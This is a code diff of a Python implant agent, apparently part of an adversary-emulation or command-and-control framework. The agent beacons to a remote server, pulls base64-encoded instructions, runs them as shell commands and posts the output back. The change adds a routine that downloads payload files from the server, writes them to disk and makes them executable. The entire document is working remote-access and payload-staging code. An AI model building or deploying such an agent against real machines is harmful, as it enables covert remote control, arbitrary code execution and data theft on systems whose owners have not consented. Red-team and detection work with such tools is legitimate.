@@ -5,6 +5,7 @@ import platform
 import subprocess
 import socket
 import time
+import stat
 from base64 import b64encode, b64decode
 
 import requests
@@ -15,32 +16,39 @@ class OperationLoop:
 
     def __init__(self, profile):
         self.profile = profile
+        self.file_download_endpoint = "/file/download"
+        self.file_download_url = self.profile['server'].split('/weather')[0] + self.file_download_endpoint
 
     def start(self):
-        while True:
-            try:
-                self.profile['results'] = []
-                print('[*] Sending beacon for %s' % self.profile.get('paw', 'unknown'))
+        """Agent loop operation:
+            - Send beacon - where possible results are sent to server and next instructions retrieved
+            - Instructions executed, results stored
+            - sleep for set time
+        """
+        self.profile['results'] = []
+        print('[*] Sending beacon for %s' % self.profile.get('paw', 'unknown'))
+        try:
+            while True:
                 beacon = self._send_beacon()
+                self.profile['results'].clear()
                 instructions = self._next_instructions(beacon=beacon)
                 sleep = self._handle_instructions(instructions)
                 time.sleep(sleep)
-            except Exception as e:
-                print('[-] Operation loop error: %s' % e)
-                time.sleep(30)
+        except Exception as e:
+            print('[-] Operation loop error: %s' % e)
+            time.sleep(30)
 
     """ PRIVATE """
 
     def _handle_instructions(self, instructions):
         self.profile['paw'] = instructions['paw']
         for instruction in json.loads(instructions['instructions']):
-            result, seconds = self._execute_instruction(json.loads(instruction))
+            i = json.loads(instruction)
+            if i['payloads']:
+                self._download_payloads(i['payloads'])
+            result, seconds = self._execute_instruction(i)
             self.profile['results'].append(result)
-            self._send_beacon()
-            self.profile['results'] = []
             time.sleep(seconds)
-        else:
-            self._send_beacon()
         return instructions['sleep']
 
     def _next_instructions(self, beacon):
@@ -49,14 +57,20 @@ class OperationLoop:
         return json.loads(self._decode_bytes(instructions.contents[0]))
 
     def _send_beacon(self):
-        website = '%s?profile=%s' % (self.profile['server'], self._encode_string(json.dumps(self.profile)))
-        return requests.get(website)
+        return requests.post(self.profile['server'], data=self._encode_string(json.dumps(self.profile)))
 
     def _execute_instruction(self, i):
         print('[+] Running instruction: %s' % i['id'])
         cmd = self._decode_bytes(i['command'])
         output = subprocess.check_output(cmd, shell=True, timeout=i['timeout'])
         return dict(output=self._encode_string(output.decode('utf-8', errors='ignore')), pid=os.getpid(), status=0, id=i['id']), i['sleep']
+
+    def _download_payloads(self, payloads):
+        for p in payloads:
+            r = requests.get(self.file_download_url, headers={'file': p})
+            with open(r.headers['FILENAME'], 'w') as fh:
+                fh.write(r.content.decode('utf-8'))
+            os.chmod(r.headers['FILENAME'], stat.S_IXUSR ^ stat.S_IRUSR ^ stat.S_IWUSR ^ stat.S_IRGRP ^ stat.S_IWGRP)
 
     @staticmethod
     def _decode_bytes(s):
